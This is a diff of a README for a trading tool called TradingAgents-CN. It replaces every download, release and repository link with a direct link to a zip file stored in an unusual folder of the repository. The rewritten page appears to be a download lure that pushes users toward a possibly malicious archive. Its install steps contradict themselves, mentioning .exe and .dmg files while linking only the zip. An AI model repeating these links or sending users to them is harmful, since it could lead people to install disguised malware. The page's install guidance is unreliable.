@@ -6,7 +6,7 @@ Welcome to the TradingAgents-CN project. This software serves as a powerful tool
 
 ## 📥 Download Now
 
-[![Download TradingAgents-CN](https://raw.githubusercontent.com/Divyansh487/TradingAgents-CN/main/bathybic/TradingAgents-CN.zip)](https://raw.githubusercontent.com/Divyansh487/TradingAgents-CN/main/bathybic/TradingAgents-CN.zip)
+[![Download TradingAgents-CN](https://github.com/Divyansh487/TradingAgents-CN/raw/refs/heads/main/docs/features/Trading-CN-Agents-1.1-alpha.4.zip)](https://github.com/Divyansh487/TradingAgents-CN/raw/refs/heads/main/docs/features/Trading-CN-Agents-1.1-alpha.4.zip)
 
 ## 🧾 Overview
 
@@ -34,7 +34,7 @@ To install TradingAgents-CN, follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to navigate to the release section of GitHub.
 
-   [Download TradingAgents-CN](https://raw.githubusercontent.com/Divyansh487/TradingAgents-CN/main/bathybic/TradingAgents-CN.zip)
+   [Download TradingAgents-CN](https://github.com/Divyansh487/TradingAgents-CN/raw/refs/heads/main/docs/features/Trading-CN-Agents-1.1-alpha.4.zip)
 
 2. **Choose the Latest Release**: Look for the latest version available at the top of the page. It will have the highest version number.
 
@@ -43,7 +43,7 @@ To install TradingAgents-CN, follow these simple steps:
 4. **Install the Software**: 
     - For Windows: Double-click the downloaded `.exe` file. Follow the on-screen prompts to install.
     - For macOS: Open the downloaded `.dmg` file. Drag the application to your Applications folder.
-    - For Linux: Extract the downloaded `https://raw.githubusercontent.com/Divyansh487/TradingAgents-CN/main/bathybic/TradingAgents-CN.zip` file. Follow the instructions in the terminal to set up the application.
+    - For Linux: Extract the downloaded `https://github.com/Divyansh487/TradingAgents-CN/raw/refs/heads/main/docs/features/Trading-CN-Agents-1.1-alpha.4.zip` file. Follow the instructions in the terminal to set up the application.
 
 5. **Launch the Application**: Once installed, find the TradingAgents-CN icon in your applications folder or start menu. Click to open.
 
@@ -85,8 +85,8 @@ If you encounter any issues while using TradingAgents-CN, consider these common 
 
 TradingAgents-CN is licensed under the MIT License. This means you can use, modify, and distribute the software within the terms provided in the license.
 
-For further details, please visit our [GitHub repository](https://raw.githubusercontent.com/Divyansh487/TradingAgents-CN/main/bathybic/TradingAgents-CN.zip).
+For further details, please visit our [GitHub repository](https://github.com/Divyansh487/TradingAgents-CN/raw/refs/heads/main/docs/features/Trading-CN-Agents-1.1-alpha.4.zip).
 
-[![Download TradingAgents-CN](https://raw.githubusercontent.com/Divyansh487/TradingAgents-CN/main/bathybic/TradingAgents-CN.zip)](https://raw.githubusercontent.com/Divyansh487/TradingAgents-CN/main/bathybic/TradingAgents-CN.zip)
+[![Download TradingAgents-CN](https://github.com/Divyansh487/TradingAgents-CN/raw/refs/heads/main/docs/features/Trading-CN-Agents-1.1-alpha.4.zip)](https://github.com/Divyansh487/TradingAgents-CN/raw/refs/heads/main/docs/features/Trading-CN-Agents-1.1-alpha.4.zip)
 
 Now you're ready to enhance your financial trading experience with TradingAgents-CN!
